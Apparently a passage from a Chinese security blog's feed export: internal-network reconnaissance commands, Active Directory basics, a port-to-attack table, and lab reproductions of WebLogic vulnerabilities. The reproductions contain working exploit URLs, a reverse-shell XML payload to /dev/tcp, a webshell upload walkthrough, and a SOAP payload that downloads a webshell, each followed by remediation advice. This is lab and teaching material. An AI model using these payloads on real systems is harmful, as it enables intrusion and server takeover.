查看登陆域</span><br><span class="line"></span><br><span class="line">spn –l administrator spn 记录</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> 环境变量</span><br><span class="line"></span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例</span><br><span class="line"></span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line"></span><br><span class="line">dsquery computer 查询所有计算机名称 windows <span class="number">2003</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /s *.exe 查找指定目录下及子目录下没隐藏文件</span><br><span class="line"></span><br><span class="line">arp -a   查询通信</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all 查询当前环境</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10gawvv.png" alt="0"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user /domain 查询当前域用户</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10ggmx8.png" alt="1"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> 查询 域控</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10gyvdy.png" alt="2"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group /domain 查询域工作组</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10h4wo3.png" alt="3"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain 查询域管理用户</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10hhvad.png" alt="4"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;Domain controllers&quot;查询有几台域控制器 需要域权限</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10hlsxg.png" alt="5"></p><h1 id="查找域服务器"><a href="#查找域服务器" class="headerlink" title="查找域服务器"></a>查找域服务器</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> 查询时间 这个命令会请求域服务器的时间</span><br><span class="line"><span class="built_in">net</span> config workstation 查看当前工作环境</span><br><span class="line">nltest /dclist:域名 查询域控</span><br><span class="line"><span class="built_in">ping</span>/nslookup 查找域控</span><br></pre></td></tr></table></figure><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>在域内进行横行渗透时，首先要收集主机的端口和 ip 信息</p><p>net view &#x2F;domain 查询域内的主机信息</p><p>发生系统错误 6118 出现这种错误时<strong>Computer Browser</strong>被禁用了,  在域管理启用即可<br><img src="https://pic.888888.al/i/2023/08/15/10ipbix.png" alt="6"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">arp -a 查询通信</span><br><span class="line"></span><br><span class="line">nbtscan.exe -r <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">0</span>/<span class="number">24</span> 发现主机</span><br></pre></td></tr></table></figure><h2 id="基于-MSF-的内网主机探测"><a href="#基于-MSF-的内网主机探测" class="headerlink" title="基于 MSF 的内网主机探测"></a>基于 MSF 的内网主机探测</h2><p>使用 msf 进行反弹 shell 进行内网渗透时，通过 msf 自带的扫描模块进行快速扫<br>描。</p><p>主机存活探测：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep ARP 扫描</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep UDP 扫描</span><br><span class="line">auxiliary/scanner/netbios/nbname NETBIOS 扫描</span><br><span class="line">auxiliary/scanner/snmp/snmp_enum SNMP 扫描</span><br><span class="line">auxiliary/scanner/smb/smb_version SMB 扫描</span><br><span class="line">端口扫描：</span><br><span class="line">auxiliary/scanner/portscan/ack TCP ACK 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce FTP bounce 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn SYN 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp TCP 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas TCP XMas 端口扫描</span><br></pre></td></tr></table></figure><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap 是一个端口扫描器，可用于主机发现、端口扫描、版本检测、OS 检测等。</p><p>使用场景：建立 socks 代理，proxychains+Nmap 扫描内网。</p><p>支持多种扫描模式：</p><p>-sT: TCP 扫描</p><p>-sS: SYN 扫描</p><p>-sA: ACK 扫描</p><p>-sF：FIN 扫描</p><p>-sU: UDP 扫描</p><p>-sR: RPC 扫描</p><p>-sP: ICMP 扫描</p><p>快速扫描所有端口：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sS -p <span class="number">1</span>-<span class="number">65535</span> -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">99</span>.<span class="number">177</span></span><br></pre></td></tr></table></figure><h1 id="常见的端口与服务"><a href="#常见的端口与服务" class="headerlink" title="常见的端口与服务"></a>常见的端口与服务</h1><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21&#x2F;22&#x2F;69</td><td>ftp&#x2F;tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破 OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS 区域传输\DNS 劫持\DNS 缓存投毒\DNS欺骗\利用 DNS 隧道技术刺透防火墙</td></tr><tr><td>67&#x2F;68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>445</td><td>SMB</td><td>远程代码执行</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>linux r</td><td>直接使用 rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift 后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase&#x2F;DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic Java</td><td>反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80&#x2F;443&#x2F;8080</td><td>web</td><td>常见 web 攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9080</td><td>websphere</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere</td><td>控制台 爆破：控制台弱口令\Java 反序列</td></tr><tr><td>9200&#x2F;9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网基础知识</title>
      <link href="/archives/2bfd09c1.html"/>
      <url>/archives/2bfd09c1.html</url>
      
        <content type="html"><![CDATA[<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>工作组:工作组是局域网中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 computer 按照不同的要求分类到不同的组。<br><img src="https://pic.888888.al/i/2023/08/15/zo8d2k.png" alt="0"></p><p><strong>域:</strong> 用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域<br>(Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个<br>域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作<br>组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域<br>内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什<br>么样的权限,还需要取决于你在该域中的用户身份。</p><h2 id="域的几种环境"><a href="#域的几种环境" class="headerlink" title="域的几种环境"></a>域的几种环境</h2><h3 id="•-单域"><a href="#•-单域" class="headerlink" title="• 单域"></a>• 单域</h3><p>通常一个小公司，一般一个域就可以，一个域内，要至少两台域服务器，一<br>台作为域控制器，另一台当备份。<br>活动目录的数据库【包括用户的账号信息】是存储在域控制器中，若没备<br>份，瘫痪了不能正常使用了！<br>父域和子域<br>出于管理及其他需求，需要在网络中划分多个域。第一个域称为父域，其他为子<br>域</p><h3 id="•-域树"><a href="#•-域树" class="headerlink" title="• 域树"></a>• 域树</h3><p><img src="https://pic.888888.al/i/2023/08/15/zoc68u.png" alt="1"></p><h3 id="•-域森林"><a href="#•-域森林" class="headerlink" title="• 域森林"></a>• 域森林</h3><p>指的是多个域树通过建立信任关系组成的集合</p><p>比如：一个公司并购其他公司<br><img src="https://pic.888888.al/i/2023/08/15/zpmm9r.png" alt="2"></p><h2 id="域名服务器-DNS"><a href="#域名服务器-DNS" class="headerlink" title="域名服务器 DNS"></a>域名服务器 DNS</h2><p>是指用于实现域名和与之相对应的 IP 地址转换的服务器。从对域树的介绍中来看<br>出，域树中的域名和 DNS 域名非常相似。而实际上，因为域名的计算机是使用<br>DNS 来定位域控制器、服务器及其他计算机、网络服务的，所以域的名字就是<br>DNS 域的名字。</p><p>在内网渗透测试中，大都是通过寻找 DNS 服务器来确定域控制器的位置的{DNS<br>服务器和域控制器通常配置在同一台机器上}</p><h2 id="域术语"><a href="#域术语" class="headerlink" title="域术语"></a>域术语</h2><p>DC:域控，域的创建者</p><p>域管理:域控上的管理员</p><p>AD 活得目录:Active Directory</p><p>NTDS.dit:域用户帐户以域数据库的形式保存在活动目录中</p><p>Ntdsutil.exe-ntdsutil.exe 是域控制器自带的域数据库管理工具，从 windows<br>Server 2008 开始就默认自带了。因此我们可以通过 ntdsutil.exe 提取出域中所有<br>的域用户信息。</p><p>常见结构:组织单元(OU)、域(DOMAIN)、域树(tree)、域森林(forest)，在域树内的<br>所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一<br>个域只存储该域内的数据<br>活动目录:</p><ul><li><p>帐号集中管理：所有帐号均存在服务器上，方便对帐号的重命名&#x2F;重置密码。</p></li><li><p>软件集中管理：统一推送软件，统一安装网络打印机等。利用软件发布策略分发<br>软件,可以让用户自由选择安装软件。</p></li><li><p>环境集中管理：利用 AD 可以统一客户端桌面，IE，TCP&#x2F;IP 等设置。</p></li><li><p>增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统<br>一制订用户密码策略等，可监控网络，资料统一管理。</p></li><li><p>更可靠：更少的宕机时间。如：利用 AD 控制用户访问权限，利用群集、负载均<br>衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</p></li><li><p>活动目录为 Microsoft 统一管理的基础平台，其它 ISA、Exchange、SMS 等服务<br>都依赖于这个基础平台。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-14882 WebLogic远程代码执行漏洞</title>
      <link href="/archives/a67ffbba.html"/>
      <url>/archives/a67ffbba.html</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-14882-WebLogic远程代码执行漏洞"><a href="#CVE-2020-14882-WebLogic远程代码执行漏洞" class="headerlink" title="CVE-2020-14882 WebLogic远程代码执行漏洞"></a>CVE-2020-14882 WebLogic远程代码执行漏洞</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>2020年10月28日，Oracle发布的10月安全更新中的Oracle WebLogic Server 远程代码执行漏洞（CVE-<br>2020-14882）POC被公开，远程攻击者可以通过发送恶意的HTTP GET 请求。成功利用此漏洞的攻击者<br>可在未经身份验证的情况下控制 WebLogic Server Console ，并执行任意代码。<br>2020年10月29日, Oracle发布的漏洞补丁CVE-2020-14882存在可绕过的0day漏洞。即在Weblogic补丁<br>更新完成后，攻击者仍可绕过WebLogic后台登录等限制，并控制Weblogic服务器。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle Weblogic Server 10.3.6.0.0</span><br><span class="line">Oracle Weblogic Server 12.1.3.0.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.3.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.4.0</span><br><span class="line">Oracle Weblogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>首先进入CVE-2020-14882的docker环境</p><p>sudo docker-compose up -d</p><p>构造url 达到未授权登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.J</span><br><span class="line">MXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zllc5y.png" alt="0"><br>访问即可进入后台，达到未授权访问的效果</p><p>但是这里没有部署安装的按钮，也就是说不能像常规进入后台后写shell进去，这里就需要用到远程加载<br>XML文件拿shell</p><p>首先测试以下漏洞代码执行是否成功，在&#x2F;tmp&#x2F;下创建一个test文件夹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001//console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSess</span><br><span class="line">ion(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/test%27);%22);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it cve202014882_weblogic_1 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zlzl0h.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># reverse-bash.xml</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">&lt;constructor-arg&gt;</span><br><span class="line">&lt;list&gt;</span><br><span class="line">&lt;value&gt;/bin/bash&lt;/value&gt;</span><br><span class="line">&lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">&lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.0.182/9999 0&gt;&amp;1]]&gt;&lt;/value&gt;</span><br><span class="line">&lt;/list&gt;</span><br><span class="line">&lt;/constructor-arg&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>nc开启监听端口，访问</p><p>nc -lvnp 9999</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.c</span><br><span class="line">ontext.support.ClassPathXmlApplicationContext(&quot;http://192.168.0.182/reversebash.xml&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zm46x5.png" alt="2"></p><h2 id="4-修复方案"><a href="#4-修复方案" class="headerlink" title="4.修复方案"></a>4.修复方案</h2><p>修复建议</p><p>安装官方最新补丁进行升级：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.oracle.com/security-alerts/cpuapr2020.html</span><br></pre></td></tr></table></figure><p>临时措施：</p><p>由于该漏洞的补丁存在被绕过的风险，建议临时关闭后台&#x2F;console&#x2F;console.portal对外访问。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic CVE-2018-2894文件任意上传</title>
      <link href="/archives/8cb2dd9e.html"/>
      <url>/archives/8cb2dd9e.html</url>
      
        <content type="html"><![CDATA[<h1 id="WebLogic-CVE-2018-2894文件任意上传"><a href="#WebLogic-CVE-2018-2894文件任意上传" class="headerlink" title="WebLogic CVE-2018-2894文件任意上传"></a>WebLogic CVE-2018-2894文件任意上传</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。</p><p>Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service<br>Test Page 在 ‘生产模式’ 下默认不开启，所以该漏洞有一定限制。两个页面分别<br>为&#x2F;ws_utc&#x2F;begin.do、&#x2F;ws_utc&#x2F;config.do。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><p>weblogic 10.3.6.0、weblogic 12.1.3.0、weblogic 12.2.1.2、weblogic 12.2.1.3。</p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>打开vulhub里的docker环境</p><p>cd &#x2F;vulhub&#x2F;weblogic</p><p>sudo apt install docker-compose 没有可以先安装这个组件</p><p> sudo docker-compose up -d</p><p> <img src="https://pic.888888.al/i/2023/08/15/ziy0x3.png" alt="0"><br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> http://192.168.0.159:7001/console/login/LoginForm.jsp</span><br><span class="line">获取账号和密码</span><br><span class="line">sudo docker-compose logs | grep password</span><br><span class="line">weblogic dojvLfj3</span><br></pre></td></tr></table></figure><br><img src="https://pic.888888.al/i/2023/08/15/zj3kty.png" alt="1"><br>保存 进入开发模式</p><p>开发环境下的测试页有两个，分别为 config.do 和 begin.do</p><p>首先进入 config.do 文件进行设置，将目录设置为 ws_utc 应用的静态文件css目录，访问这个目录是无<br>需权限的，这一点很重要。</p><p>来到这个页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/ws_utc/config.do</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zjhs4y.png" alt="2"></p><p>设置工作目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_intern</span><br><span class="line">al/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p>点击添加后上传一个jsp<br><img src="https://pic.888888.al/i/2023/08/15/zjluzj.png" alt="3"><br>提交之后点击F12审查元素得到jsp上传后的时间戳<br><img src="https://pic.888888.al/i/2023/08/15/zjpscy.png" alt="4"><br>访问路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/ws_utc/css/config/keystore/1631163729917_shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zk3kwh.png" alt="5"><br>这里我们在对 begin.do 未授权访问进行利用。访问<a href="http://192.168.0.159:7001/ws_utc/begin.do%EF%BC%8C%E4%B8%8A">http://192.168.0.159:7001/ws_utc/begin.do，上</a><br>传一个jsp<br><img src="https://pic.888888.al/i/2023/08/15/zk8jrn.png" alt="6"><br>点击提交，这里辉显示一个error不用管它，F12进入网络，然后筛选POST方法，得到一个jsp的路径<br><img src="https://pic.888888.al/i/2023/08/15/zkdygj.png" alt="7"><br>构造得到<a href="http://192.168.0.159:7001/ws_utc/css/upload/RS_Upload_2021-09-09_05-08-33_853/impo">http://192.168.0.159:7001/ws_utc/css/upload/RS_Upload_2021-09-09_05-08-33_853/impo</a><br>rt_file_name_z.jsp，冰蝎连接即可<br><img src="https://pic.888888.al/i/2023/08/15/zkwrj9.png" alt="8"></p><h2 id="4-修复方案"><a href="#4-修复方案" class="headerlink" title="4.修复方案"></a>4.修复方案</h2><p><strong>1.升级 设置强口令</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic T3协议反序列化命令执行漏洞</title>
      <link href="/archives/b5c3927d.html"/>
      <url>/archives/b5c3927d.html</url>
      
        <content type="html"><![CDATA[<h1 id="WebLogic-T3协议反序列化命令执行漏洞-CVE-2018-2628"><a href="#WebLogic-T3协议反序列化命令执行漏洞-CVE-2018-2628" class="headerlink" title="WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)"></a>WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它<br>Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中,<br>并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开<br>启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件<br>的远程代码执行攻击</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p><img src="https://pic.888888.al/i/2023/08/15/zhqxhu.png" alt="0"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载poc</span><br><span class="line">git clone https://github.com/jas502n/CVE-2018-2628.git</span><br><span class="line">进入CVE-2018-2628目录执行getshell命令</span><br><span class="line">python CVE-2018-2628-Getshell.py 192.168.0.159 47136 shell.jsp</span><br><span class="line">python CVE-2018-2628-Getshell.py ip port shell.jsp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zhui7g.png" alt="1"><br><img src="https://pic.888888.al/i/2023/08/15/zhyll7.png" alt="2"></p><h2 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h2><p>1.及时更新补丁</p><p>2.禁用T3协议</p><p>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wls-wsat反序列化漏洞(CVE-2019-2725)</title>
      <link href="/archives/593eaa36.html"/>
      <url>/archives/593eaa36.html</url>
      
        <content type="html"><![CDATA[<h1 id="wls-wsat反序列化漏洞-CVE-2019-2725"><a href="#wls-wsat反序列化漏洞-CVE-2019-2725" class="headerlink" title="wls-wsat反序列化漏洞(CVE-2019-2725)"></a>wls-wsat反序列化漏洞(CVE-2019-2725)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的<br>xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><p>weblogic 10.x</p><p>weblogic 12.1.3</p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>漏洞存在于：_async&#x2F;AsyncResponseService，访问地址可以访问则存在漏洞：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/_async/AsyncResponseService</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zcf26j.png" alt="0"></p><p>使用burpsuite提交poc 下载远程后门到指定目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.0.185:7001</span><br><span class="line">Content-Length: 910</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction:</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><br><span class="line">xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;</span><br><span class="line">xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;powershell(new-object</span><br><span class="line">System.Net.WebClient).DownloadFile(&#x27;http://192.168.0.182:81/shell.jsp.txt&#x27;,&#x27;serv</span><br><span class="line">ers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</span><br><span class="line">&#x27;)&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><a href="http://192.168.0.185:7001/_async/webshell.jsp">http://192.168.0.185:7001/_async/webshell.jsp</a> 连接后门</p><p><img src="https://pic.888888.al/i/2023/08/15/zcm7dh.png" alt="1"></p><h2 id="4-修复建议"><a href="#4-修复建议" class="headerlink" title="4.修复建议"></a>4.修复建议</h2><p>禁用bea_wls9_async_response组件</p><p>删除wls9_async_response的war包并重启</p><p>禁止访问 &#x2F;_async&#x2F;* 路径</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMLDecoder反序列化漏洞(CVE-2017-3506)</title>
      <link href="/archives/f622fe60.html"/>
      <url>/archives/f622fe60.html</url>
      
